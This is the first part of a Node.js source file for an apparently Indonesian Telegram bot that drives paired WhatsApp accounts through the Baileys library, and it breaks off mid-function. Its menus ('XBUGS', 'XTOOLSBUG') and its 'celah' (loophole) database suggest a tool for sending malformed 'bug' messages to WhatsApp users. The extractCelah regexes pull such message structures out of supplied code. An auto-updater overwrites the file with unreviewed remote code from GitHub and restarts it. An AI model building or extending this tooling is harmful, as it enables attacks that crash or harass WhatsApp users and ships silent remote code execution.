const {
    default: makeWASocket,
    useMultiFileAuthState,
    generateWAMessageFromContent,
    DisconnectReason,
} = require('@denzz221/baileys');
const fs = require("fs-extra");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();
const axios = require("axios");
const chalk = require("chalk");
const moment = require('moment');
const config = require("./setting/config.js");
const TelegramBot = require("node-telegram-bot-api");
const acorn = require("acorn");
const vm = require("vm");

// ================= KONFIGURASI ================= //
const BOT_TOKEN = config.BOT_TOKEN;
const OWNER_ID = config.OWNER_ID;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const thumbnailUrl = "https://files.catbox.moe/6ogo26.jpg";

// Konfigurasi GitHub Auto Update
const GITHUB_RAW_URL = "https://raw.githubusercontent.com/sihalohoalexander389-oss/primrose-bot/main/index.js";
const CURRENT_VERSION = "3.0.46";
const AUTO_UPDATE_FILE = "./database/auto_update.json";
const PENDING_UPDATE_FILE = "./database/pending_update.json";

// Konstanta pairing
const PAIRING_TIMEOUT = 60000;
const PAIRING_COOLDOWN = 5000;

// ================= DATABASE FILES ================= //
const GROUP_PREMIUM_FILE = "./database/group_premium.json";
const BLOCKED_COMMANDS_FILE = "./database/blocked_commands.json";
const COLOR_SETTING_FILE = "./database/color_setting.json";
const CELAH_DATABASE_FILE = "./database/celah_database.json";
const PREMIUM_FILE = "./database/premium.json";
const ADMIN_FILE = "./database/admin.json";

// Pastikan folder database ada
if (!fs.existsSync("./database")) {
    fs.mkdirSync("./database", { recursive: true });
}
if (!fs.existsSync(SESSIONS_DIR)) {
    fs.mkdirSync(SESSIONS_DIR, { recursive: true });
}

// ================= HELPER FUNCTIONS ================= //
function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists(GROUP_PREMIUM_FILE, []);
ensureFileExists(BLOCKED_COMMANDS_FILE, []);
ensureFileExists(COLOR_SETTING_FILE, { color: "disco" });
ensureFileExists(CELAH_DATABASE_FILE, []);
ensureFileExists(PREMIUM_FILE, []);
ensureFileExists(ADMIN_FILE, []);
ensureFileExists(AUTO_UPDATE_FILE, { enabled: true });
ensureFileExists(SESSIONS_FILE, []);

// ================= LOAD DATA ================= //
let groupPremiumData = [];
let blockedCommands = [];
let currentColor = "disco";
let celahDatabase = [];
let premiumUsers = [];
let adminUsers = [];

function loadAllData() {
    try {
        groupPremiumData = JSON.parse(fs.readFileSync(GROUP_PREMIUM_FILE));
        blockedCommands = JSON.parse(fs.readFileSync(BLOCKED_COMMANDS_FILE));
        currentColor = JSON.parse(fs.readFileSync(COLOR_SETTING_FILE)).color;
        celahDatabase = JSON.parse(fs.readFileSync(CELAH_DATABASE_FILE));
        premiumUsers = JSON.parse(fs.readFileSync(PREMIUM_FILE));
        adminUsers = JSON.parse(fs.readFileSync(ADMIN_FILE));
    } catch (error) {
        console.error("Error loading data:", error);
    }
}

loadAllData();

function saveGroupPremiumData() { fs.writeFileSync(GROUP_PREMIUM_FILE, JSON.stringify(groupPremiumData, null, 2)); }
function saveBlockedCommands() { fs.writeFileSync(BLOCKED_COMMANDS_FILE, JSON.stringify(blockedCommands, null, 2)); }
function saveColorSetting() { fs.writeFileSync(COLOR_SETTING_FILE, JSON.stringify({ color: currentColor }, null, 2)); }
function saveCelahDatabase() { fs.writeFileSync(CELAH_DATABASE_FILE, JSON.stringify(celahDatabase, null, 2)); }
function savePremiumUsers() { fs.writeFileSync(PREMIUM_FILE, JSON.stringify(premiumUsers, null, 2)); }
function saveAdminUsers() { fs.writeFileSync(ADMIN_FILE, JSON.stringify(adminUsers, null, 2)); }

// ================= AUTO UPDATE ================= //
let autoUpdateEnabled = JSON.parse(fs.readFileSync(AUTO_UPDATE_FILE)).enabled;

function saveAutoUpdateSetting(enabled) {
    autoUpdateEnabled = enabled;
    fs.writeFileSync(AUTO_UPDATE_FILE, JSON.stringify({ enabled }, null, 2));
}

function savePendingUpdate(chatId, oldVersion, newVersion) {
    fs.writeFileSync(PENDING_UPDATE_FILE, JSON.stringify({ chatId, oldVersion, newVersion, timestamp: Date.now() }, null, 2));
}

function getPendingUpdate() {
    if (!fs.existsSync(PENDING_UPDATE_FILE)) return null;
    return JSON.parse(fs.readFileSync(PENDING_UPDATE_FILE));
}

function clearPendingUpdate() {
    if (fs.existsSync(PENDING_UPDATE_FILE)) fs.unlinkSync(PENDING_UPDATE_FILE);
}

async function checkForUpdates() {
    try {
        console.log(chalk.cyan("🔍 Mengecek update dari GitHub..."));
        const response = await axios.get(GITHUB_RAW_URL, { timeout: 10000 });
        const remoteContent = response.data;
        const remoteVersionMatch = remoteContent.match(/CURRENT_VERSION = "([^"]+)"/);
        const remoteVersion = remoteVersionMatch ? remoteVersionMatch[1] : "unknown";
        if (remoteVersion !== CURRENT_VERSION) {
            console.log(chalk.yellow(`📦 Update tersedia! Versi ${CURRENT_VERSION} → ${remoteVersion}`));
            return { hasUpdate: true, newVersion: remoteVersion, content: remoteContent };
        }
        console.log(chalk.green("✅ Bot sudah versi terbaru!"));
        return { hasUpdate: false };
    } catch (error) {
        console.error(chalk.red("❌ Gagal mengecek update:", error.message));
        return { hasUpdate: false, error: error.message };
    }
}

async function performUpdate(chatId) {
    try {
        const update = await checkForUpdates();
        if (!update.hasUpdate) {
            if (chatId) await safeSendMessage(chatId, `✅ Bot sudah versi terbaru! (v${CURRENT_VERSION})`);
            return false;
        }
        savePendingUpdate(chatId, CURRENT_VERSION, update.newVersion);
        fs.writeFileSync(__filename, update.content);
        console.log(chalk.green("✅ File index.js berhasil diupdate!"));
        if (chatId) await safeSendMessage(chatId, `✅ Update berhasil! Versi ${CURRENT_VERSION} → ${update.newVersion}\n🔄 Bot akan restart dalam 3 detik...`);
        setTimeout(() => process.exit(0), 3000);
        return true;
    } catch (error) {
        console.error(chalk.red("❌ Gagal update:", error.message));
        if (chatId) await safeSendMessage(chatId, `❌ Gagal update: ${error.message}`);
        return false;
    }
}

let autoUpdateInterval = null;

function startAutoUpdateChecker() {
    if (autoUpdateInterval) clearInterval(autoUpdateInterval);
    autoUpdateInterval = setInterval(async () => {
        if (!autoUpdateEnabled) return;
        console.log(chalk.cyan("🔄 Auto update check..."));
        const update = await checkForUpdates();
        if (update.hasUpdate) {
            console.log(chalk.yellow(`📦 Auto update ditemukan! Versi ${CURRENT_VERSION} → ${update.newVersion}`));
            await performUpdate(null);
        }
    }, 60 * 60 * 1000);
}

function stopAutoUpdateChecker() {
    if (autoUpdateInterval) {
        clearInterval(autoUpdateInterval);
        autoUpdateInterval = null;
    }
}

// ================= TELEGRAM BOT ================= //
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ================= SAFE FUNCTIONS ================= //
async function safeSendMessage(chatId, text, options = {}) {
    if (!chatId) {
        console.error("❌ safeSendMessage: chat_id is empty!");
        return null;
    }
    try {
        return await bot.sendMessage(chatId, text, options);
    } catch (error) {
        console.error("Error sending message:", error.message);
        return null;
    }
}

async function safeEditMessageText(chatId, messageId, newText, options = {}) {
    if (!chatId || !messageId) return null;
    try {
        return await bot.editMessageText(newText, { chat_id: chatId, message_id: messageId, ...options });
    } catch (error) {
        if (error.response?.body?.description?.includes("message is not modified")) return null;
        if (error.response?.body?.description?.includes("message to edit not found")) return null;
        console.error("Error editing message:", error.message);
        return null;
    }
}

async function safeEditMessageMedia(chatId, messageId, media, options = {}) {
    if (!chatId || !messageId) return null;
    try {
        return await bot.editMessageMedia(media, { chat_id: chatId, message_id: messageId, ...options });
    } catch (error) {
        if (error.response?.body?.description?.includes("message is not modified")) return null;
        if (error.response?.body?.description?.includes("message to edit not found")) return null;
        console.error("Error editing media:", error.message);
        return null;
    }
}

async function safeEditMessageReplyMarkup(chatId, messageId, replyMarkup) {
    if (!chatId || !messageId) return null;
    try {
        return await bot.editMessageReplyMarkup(replyMarkup, { chat_id: chatId, message_id: messageId });
    } catch (error) {
        if (error.response?.body?.description?.includes("message is not modified")) return null;
        if (error.response?.body?.description?.includes("message to edit not found")) return null;
        return null;
    }
}

async function safeSendPhoto(chatId, photo, options = {}) {
    if (!chatId) return null;
    try {
        return await bot.sendPhoto(chatId, photo, options);
    } catch (error) {
        console.error("Error sending photo:", error.message);
        return null;
    }
}

// ================= START BOT ================= //
function startBot() {
    console.log(chalk.red(`
⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀
`));
    console.log(chalk.red(`
Informasi:
Dev : t.me/ItsMeXanderRzMd
Channel : https://t.me/allteamlinux
Version: ${CURRENT_VERSION}
Auto Update: ${autoUpdateEnabled ? "ON" : "OFF"}
`));
    console.log(chalk.blue(`[ 🚀 BOT BERJALAN... ]`));
}

// ================= WHATSAPP CONNECTION ================= //
let reconnectAttempts = new Map();
let pingIntervals = new Map();
let pairingInProgress = new Map();

function startPingInterval(botNumber, ws) {
    if (pingIntervals.has(botNumber)) clearInterval(pingIntervals.get(botNumber));
    const interval = setInterval(() => {
        if (ws && ws.user) {
            ws.sendMessage(botNumber + "@s.whatsapp.net", { text: " " }).catch(() => {});
        }
    }, 25000);
    pingIntervals.set(botNumber, interval);
}

function stopPingInterval(botNumber) {
    if (pingIntervals.has(botNumber)) {
        clearInterval(pingIntervals.get(botNumber));
        pingIntervals.delete(botNumber);
    }
}

function saveActiveSessions(botNumber) {
    try {
        let sessionsList = [];
        if (fs.existsSync(SESSIONS_FILE)) {
            const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
            sessionsList = existing.includes(botNumber) ? existing : [...existing, botNumber];
        } else {
            sessionsList = [botNumber];
        }
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessionsList));
    } catch (error) {
        console.error("Error saving session:", error);
    }
}

function removeActiveSession(botNumber) {
    try {
        if (fs.existsSync(SESSIONS_FILE)) {
            let sessionsList = JSON.parse(fs.readFileSync(SESSIONS_FILE));
            sessionsList = sessionsList.filter(num => num !== botNumber);
            fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessionsList));
        }
        sessions.delete(botNumber);
        stopPingInterval(botNumber);
        pairingInProgress.delete(botNumber);
    } catch (error) {
        console.error("Error removing active session:", error);
    }
}

function createSessionDir(botNumber) {
    const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
    if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
    return deviceDir;
}

async function reconnectWithBackoff(botNumber, attempt = 1) {
    const maxAttempts = 15;
    const baseDelay = 5000;
    const maxDelay = 60000;
    let delay = Math.min(baseDelay * Math.pow(1.5, attempt - 1), maxDelay);
    console.log(`🔄 Reconnect attempt ${attempt} for ${botNumber} in ${delay}ms`);
    setTimeout(async () => {
        try {
            await reconnectWhatsApp(botNumber, attempt);
        } catch (error) {
            if (attempt < maxAttempts) {
                await reconnectWithBackoff(botNumber, attempt + 1);
            } else {
                console.error(`❌ Failed to reconnect ${botNumber} after ${maxAttempts} attempts`);
            }
        }
    }, delay);
}

async function reconnectWhatsApp(botNumber, attempt = 1) {
    try {
        console.log(`🔄 Reconnecting WhatsApp ${botNumber} (attempt ${attempt})...`);
        const sessionDir = createSessionDir(botNumber);
        if (!fs.existsSync(path.join(sessionDir, 'creds.json'))) {
            console.log(`❌ Creds.json not found for ${botNumber}, removing from active sessions`);
            removeActiveSession(botNumber);
            return null;
        }
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        const newSock = makeWASocket({
            auth: state,
            printQRInTerminal: false,
            logger: P({ level: "silent" }),
            defaultQueryTimeoutMs: 60000,
            keepAliveIntervalMs: 60000,
            connectTimeoutMs: 60000,
            emitOwnEvents: true,
            fireInitQueries: true,
            syncFullHistory: false,
            markOnlineOnConnect: false,
            generateHighQualityLinkPreview: false,
            browser: ["Primrose Linux Bot", "Chrome", "1.0.0"],
        });
        stopPingInterval(botNumber);
        newSock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
                console.log(`✅ WhatsApp ${botNumber} reconnect success!`);
                sessions.set(botNumber, newSock);
                reconnectAttempts.delete(botNumber);
                startPingInterval(botNumber, newSock);
                pairingInProgress.delete(botNumber);
            } else if (connection === "close") {
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                const shouldReconnect = statusCode !== DisconnectReason.loggedOut && statusCode !== 403;
                if (shouldReconnect && !pairingInProgress.has(botNumber)) {
                    const currentAttempt = (reconnectAttempts.get(botNumber) || 1) + 1;
                    reconnectAttempts.set(botNumber, currentAttempt);
                    console.log(`⚠️ WhatsApp ${botNumber} disconnected (${statusCode}), reconnecting...`);
                    await reconnectWithBackoff(botNumber, currentAttempt);
                } else {
                    console.log(`🚫 WhatsApp ${botNumber} logged out or blocked, removing session`);
                    removeActiveSession(botNumber);
                    stopPingInterval(botNumber);
                    pairingInProgress.delete(botNumber);
                }
            }
        });
        newSock.ev.on("creds.update", saveCreds);
        return newSock;
    } catch (error) {
        console.error(`Error reconnecting WhatsApp ${botNumber}:`, error);
        throw error;
    }
}

async function ConnectToWhatsApp(botNumber, chatId) {
    if (!chatId) {
        console.error("❌ ConnectToWhatsApp: chatId is empty!");
        throw new Error("Invalid chatId");
    }
    
    if (pairingInProgress.has(botNumber)) {
        const progressTime = pairingInProgress.get(botNumber);
        const elapsed = Date.now() - progressTime;
        if (elapsed < PAIRING_COOLDOWN) {
            await safeSendMessage(chatId, `⚠️ Pairing sedang berlangsung untuk nomor ${botNumber}\nSilakan tunggu ${Math.ceil((PAIRING_COOLDOWN - elapsed) / 1000)} detik lagi.`);
            return;
        } else {
            pairingInProgress.delete(botNumber);
        }
    }
    
    pairingInProgress.set(botNumber, Date.now());
    let statusMessage = null;
    let connectionEstablished = false;
    let pairingTimeout = null;
    let retryCount = 0;
    const MAX_RETRIES = 3;
    
    try {
        const sentMsg = await safeSendMessage(chatId, `<blockquote>Primrose Linux Bot [ 𖣂 ]</blockquote>\n— Number : ${botNumber}\n— Status : Connecting...`, { parse_mode: "HTML" });
        if (sentMsg) statusMessage = sentMsg.message_id;
    } catch (error) {
        pairingInProgress.delete(botNumber);
        throw error;
    }

    const sessionDir = createSessionDir(botNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    const newSock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: P({ level: "silent" }),
        defaultQueryTimeoutMs: 60000,
        keepAliveIntervalMs: 30000,
        connectTimeoutMs: 60000,
        emitOwnEvents: true,
        fireInitQueries: false,
        syncFullHistory: false,
        markOnlineOnConnect: false,
        generateHighQualityLinkPreview: false,
        browser: ["Primrose Linux Bot", "Chrome", "1.0.0"],
    });

    let pairingCodeRequested = false;

    const cleanup = () => {
        if (pairingTimeout) clearTimeout(pairingTimeout);
        pairingInProgress.delete(botNumber);
    };

    return new Promise((resolve, reject) => {
        pairingTimeout = setTimeout(() => {
            if (!connectionEstablished) {
                console.log(`⏰ Pairing timeout for ${botNumber}`);
                cleanup();
                if (statusMessage && chatId) {
                    safeEditMessageText(chatId, statusMessage, `<blockquote>Primrose Linux Bot [ ⏰ ]</blockquote>\n— Number : ${botNumber}\n— Status : Timeout (Coba lagi dengan /reqpair)`, { parse_mode: "HTML" }).catch(() => {});
                }
                reject(new Error("Pairing timeout"));
            }
        }, PAIRING_TIMEOUT);

        newSock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect, pairingCode } = update;
            
            if (pairingCode && !pairingCodeRequested) {
                pairingCodeRequested = true;
                const formattedCode = pairingCode.match(/.{1,4}/g)?.join("-") || pairingCode;
                if (statusMessage && chatId) {
                    await safeEditMessageText(chatId, statusMessage, `<blockquote>Primrose Linux Bot [ 🔒 ]</blockquote>\n— Number : ${botNumber}\n— Pairing Code : <code>${formattedCode}</code>\n— Status : Waiting for pairing...\n— Expires in : 2 minutes`, { parse_mode: "HTML" });
                }
                console.log(`📱 Pairing code for ${botNumber}: ${formattedCode}`);
            }
            
            if (connection === "open") {
                if (!connectionEstablished) {
                    connectionEstablished = true;
                    clearTimeout(pairingTimeout);
                    cleanup();
                    sessions.set(botNumber, newSock);
                    saveActiveSessions(botNumber);
                    startPingInterval(botNumber, newSock);
                    console.log(`✅ WhatsApp ${botNumber} connected successfully!`);
                    if (statusMessage && chatId) {
                        await safeEditMessageText(chatId, statusMessage, `<blockquote>Primrose Linux Bot [ ✅ ]</blockquote>\n— Number : ${botNumber}\n— Status : Connected Successfully!`, { parse_mode: "HTML" });
                    }
                    resolve(newSock);
                }
            } else if (connection === "close") {
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                const errorMessage = lastDisconnect?.error?.message || "Unknown error";
                console.log(`Connection closed for ${botNumber}, statusCode: ${statusCode}, error: ${errorMessage}`);
                
                if (statusCode === 515 && retryCount < MAX_RETRIES) {
                    retryCount++;
                    console.log(`🔄 Retry ${retryCount}/${MAX_RETRIES} for ${botNumber} after stream error...`);
                    if (statusMessage && chatId) {
                        await safeEditMessageText(chatId, statusMessage, `<blockquote>Primrose Linux Bot [ 🔄 ]</blockquote>\n— Number : ${botNumber}\n— Status : Reconnecting... (${retryCount}/${MAX_RETRIES})`, { parse_mode: "HTML" }).catch(() => {});
                    }
                    await sleep(3000);
                    return;
                }
                
                cleanup();
                
                if (statusCode === DisconnectReason.loggedOut || statusCode === 403) {
                    if (statusMessage && chatId) await safeEditMessageText(chatId, statusMessage, `<blockquote>Primrose Linux Bot [ ❌ ]</blockquote>\n— Number : ${botNumber}\n— Status : Gagal (Logged out / Blocked)`, { parse_mode: "HTML" });
                    removeActiveSession(botNumber);
                    reject(new Error("Logged out or blocked"));
                } else if (statusCode === 428) {
                    if (!connectionEstablished && !pairingCodeRequested) {
                        try {
                            const code = await newSock.requestPairingCode(botNumber);
                            pairingCodeRequested = true;
                            const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
                            if (statusMessage && chatId) await safeEditMessageText(chatId, statusMessage, `<blockquote>Primrose Linux Bot [ 🔒 ]</blockquote>\n— Number : ${botNumber}\n— Pairing Code : <code>${formattedCode}</code>\n— Status : Waiting for pairing...`, { parse_mode: "HTML" });
                        } catch (err) {
                            if (statusMessage && chatId) await safeEditMessageText(chatId, statusMessage, `<blockquote>Primrose Linux Bot [ ❌ ]</blockquote>\n— Number : ${botNumber}\n— Status : Error requesting pairing code`, { parse_mode: "HTML" });
                            reject(err);
                        }
                    }
                } else if (statusCode === 515) {
                    if (statusMessage && chatId) await safeEditMessageText(chatId, statusMessage, `<blockquote>Primrose Linux Bot [ 🌐 ]</blockquote>\n— Number : ${botNumber}\n— Status : Network Error (515)\n— Solusi : Coba lagi nanti atau ganti jaringan`, { parse_mode: "HTML" });
                    reject(new Error(`Stream Error (515) - Network issue`));
                } else if (statusCode === 408 || statusCode === 503) {
                    if (statusMessage && chatId) await safeEditMessageText(chatId, statusMessage, `<blockquote>Primrose Linux Bot [ ⏰ ]</blockquote>\n— Number : ${botNumber}\n— Status : Connection timeout (Coba lagi)`, { parse_mode: "HTML" });
                    reject(new Error(`Connection timeout (${statusCode})`));
                } else {
                    if (statusMessage && chatId) await safeEditMessageText(chatId, statusMessage, `<blockquote>Primrose Linux Bot [ ❌ ]</blockquote>\n— Number : ${botNumber}\n— Status : Error (${statusCode || 'unknown'})`, { parse_mode: "HTML" });
                    reject(new Error(`Connection closed: ${statusCode}`));
                }
            } else if (connection === "connecting") {
                if (statusMessage && chatId) await safeEditMessageText(chatId, statusMessage, `<blockquote>Primrose Linux Bot [ 🔄 ]</blockquote>\n— Number : ${botNumber}\n— Status : Connecting...`, { parse_mode: "HTML" });
            }
        });

        newSock.ev.on("creds.update", saveCreds);
        
        setTimeout(async () => {
            if (!pairingCodeRequested && !connectionEstablished) {
                try {
                    pairingCodeRequested = true;
                    const code = await newSock.requestPairingCode(botNumber);
                    const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
                    if (statusMessage && chatId) await safeEditMessageText(chatId, statusMessage, `<blockquote>Primrose Linux Bot [ 🔒 ]</blockquote>\n— Number : ${botNumber}\n— Pairing Code : <code>${formattedCode}</code>\n— Status : Waiting for pairing...`, { parse_mode: "HTML" });
                } catch (err) {
                    console.log(`Error requesting pairing code for ${botNumber}:`, err.message);
                }
            }
        }, 2000);
    });
}

async function initializeWhatsAppConnections() {
    try {
        if (fs.existsSync(SESSIONS_FILE)) {
            const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
            console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);
            for (const botNumber of activeNumbers) {
                console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
                const sessionDir = createSessionDir(botNumber);
                const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
                const sock = makeWASocket({
                    auth: state,
                    printQRInTerminal: true,
                    logger: P({ level: "silent" }),
                    defaultQueryTimeoutMs: 60000,
                    keepAliveIntervalMs: 60000,
                    connectTimeoutMs: 60000,
                    emitOwnEvents: true,
                    fireInitQueries: true,
                    syncFullHistory: false,
                    markOnlineOnConnect: false,
                    generateHighQualityLinkPreview: false,
                    browser: ["Primrose Linux Bot", "Chrome", "1.0.0"],
                });
                await new Promise((resolve, reject) => {
                    const timeout = setTimeout(() => { console.log(`⏰ Timeout connecting ${botNumber}`); resolve(); }, 60000);
                    sock.ev.on("connection.update", async (update) => {
                        const { connection, lastDisconnect } = update;
                        if (connection === "open") {
                            clearTimeout(timeout);
                            console.log(`Bot ${botNumber} terhubung!`);
                            sessions.set(botNumber, sock);
                            startPingInterval(botNumber, sock);
                            resolve();
                        } else if (connection === "close") {
                            const statusCode = lastDisconnect?.error?.output?.statusCode;
                            const shouldReconnect = statusCode !== DisconnectReason.loggedOut && statusCode !== 403;
                            if (shouldReconnect) {
                                console.log(`Mencoba menghubungkan ulang bot ${botNumber}... (${statusCode || 'unknown'})`);
                                reconnectWithBackoff(botNumber, 1);
                                clearTimeout(timeout);
                                resolve();
                            } else {
                                clearTimeout(timeout);
                                reject(new Error("Koneksi ditutup - logged out or blocked"));
                            }
                        }
                    });
                    sock.ev.on("creds.update", saveCreds);
                });
            }
        }
    } catch (error) {
        console.error("Error initializing WhatsApp Connections:", error);
    }
}

// ================= HELPER FUNCTIONS ================= //
function isOwner(userId) { return OWNER_ID.toString() === userId.toString(); }
function isPremium(userId) { const user = premiumUsers.find(u => u.id === userId); if (!user) return false; if (user.expiresAt === "permanent") return true; return Date.now() < user.expiresAt; }
function isCommandBlocked(commandName) { return blockedCommands.includes(commandName.toLowerCase()); }
function formatRuntime() { let sec = Math.floor(process.uptime()); let hrs = Math.floor(sec / 3600); sec %= 3600; let mins = Math.floor(sec / 60); sec %= 60; return `${hrs}h ${mins}m ${sec}s`; }
function formatMemory() { return `${(process.memoryUsage().rss / 1024 / 1024).toFixed(0)} MB`; }
function getRandomImage() { return "https://files.catbox.moe/n5forg.jpg"; }
function getCurrentDate() { return new Date().toLocaleString('id-ID', { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' }); }

// ================= BUTTON STYLES ================= //
const buttonIntervals = new Map();
let globalIntervalId = null;
let globalMessageId = null;
let globalChatId = null;
let discoActive = false;
let currentStyleIndex = 0;
const buttonStyles = ["primary", "success", "danger"];

function getButtonStyle(color) {
    switch(color) {
        case "danger": return "danger";
        case "primary": return "primary";
        case "success": return "success";
        case "secondary": return undefined;
        case "disco": return "disco";
        default: return undefined;
    }
}

function getColorFromChoice(choice) {
    switch(choice) {
        case "XRED": return "danger";
        case "XBLUE": return "primary";
        case "XGREEN": return "success";
        case "XWHITE": return "secondary";
        case "XDISCO": return "disco";
        default: return currentColor;
    }
}

async function sendColoredMenu(chatId, from, color, editMessageId = null) {
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const status = sessions.size > 0 ? "🟢 ACTIVE" : "🔴 OFFLINE";
    const botNumber = sessions.size;
    const isWhite = (color === "secondary");
    const buttonStyle = isWhite ? undefined : (color === "disco" ? buttonStyles[0] : color);
    
    let keyboard = [
        [{ text: "XBUGS", callback_data: "trashmenu", style: buttonStyle }, { text: "XTOOLSBUG", callback_data: "toolsbug_menu", style: buttonStyle }],
        [{ text: "XSETTINGS", callback_data: "owner_menu", style: buttonStyle }, { text: "XGROUPSECURITY", callback_data: "group_security_menu", style: buttonStyle }],
        [{ text: "XCHANGECOLOR", callback_data: "change_color_menu", style: buttonStyle }, { text: "DEVELOPERS", url: "https://t.me/ItsMeXanderRzMd", style: buttonStyle }]
    ];

    if (isWhite) keyboard = JSON.parse(JSON.stringify(keyboard).replace(/"style":undefined/g, '"style":null').replace(/"style":null/g, ''));

    const caption = `<blockquote><strong>☠ # Primrose Linux Bot 𖣂 ☠</strong></blockquote>\n🎩 Pemilik : @ItsMeXanderRzMd 🌟    \n😄 Owner : @realmarz 🌟\n🍽 Version : ${CURRENT_VERSION} \n🗡 Platform : Telegram\n<blockquote><b>――⧼ STATUS BOT ⧽――</b></blockquote>\n⛧ Status : ${status}\n⛧ Number : ${botNumber}\n⛧ Runtime : ${runtimeStatus}\n⛧ Memory : ${memoryStatus}`;

    let sent;
    if (editMessageId) {
        try {
            await safeEditMessageMedia(chatId, editMessageId, { type: 'photo', media: getRandomImage(), caption: caption, parse_mode: "HTML" }, { reply_markup: { inline_keyboard: keyboard } });
            sent = { message_id: editMessageId };
        } catch (error) {
            sent = await safeSendPhoto(chatId, getRandomImage(), { caption: caption, parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        }
    } else {
        sent = await safeSendPhoto(chatId, getRandomImage(), { caption: caption, parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
    }

    if (!sent) return null;

    const messageId = sent.message_id;
    globalMessageId = messageId;
    globalChatId = chatId;
    if (globalIntervalId) clearInterval(globalIntervalId);

    if (color === "disco") {
        discoActive = true;
        globalIntervalId = setInterval(async () => {
            if (!discoActive) return;
            currentStyleIndex = (currentStyleIndex + 1) % buttonStyles.length;
            const newStyle = buttonStyles[currentStyleIndex];
            let newKeyboard = [
                [{ text: "XBUGS", callback_data: "trashmenu", style: newStyle }, { text: "XTOOLSBUG", callback_data: "toolsbug_menu", style: newStyle }],
                [{ text: "XSETTINGS", callback_data: "owner_menu", style: newStyle }, { text: "XGROUPSECURITY", callback_data: "group_security_menu", style: newStyle }],
                [{ text: "XCHANGECOLOR", callback_data: "change_color_menu", style: newStyle }, { text: "DEVELOPERS", url: "https://t.me/ItsMeXanderRzMd", style: newStyle }]
            ];
            await safeEditMessageReplyMarkup(chatId, messageId, { inline_keyboard: newKeyboard });
        }, 1500);
    } else {
        discoActive = false;
        globalIntervalId = null;
    }

    buttonIntervals.set(messageId, globalIntervalId);
    return messageId;
}

async function sendStartMenu(chatId, from) { return await sendColoredMenu(chatId, from, currentColor, null); }

// ================= EXTRACT CELAH ================= //
function extractCelah(code) {
    const patterns = {
        'groupInviteMessage': /groupInviteMessage\s*:\s*{([^}]+)}/gs,
        'newsletterAdminInviteMessage': /newsletterAdminInviteMessage\s*:\s*{([^}]+)}/gs,
        'interactiveResponseMessage': /interactiveResponseMessage\s*:\s*{([^}]+)}/gs,
        'viewOnceMessage': /viewOnceMessage\s*:\s*{([^}]+)}/gs,
        'stickerMessage': /stickerMessage\s*:\s*{([^}]+)}/gs,
        'videoMessage': /videoMessage\s*:\s*{([^}]+)}/gs,
        'contactMessage': /contactMessage\s*:\s*{([^}]+)}/gs,
        'groupStatusMessageV2': /groupStatusMessageV2\s*:\s*{([^}]+)}/gs,
        'interactiveMessage': /interactiveMessage\s*:\s*{([^}]+)}/gs,
        'nativeFlowMessage': /nativeFlowMessage\s*:\s*{([^}]+)}/gs,
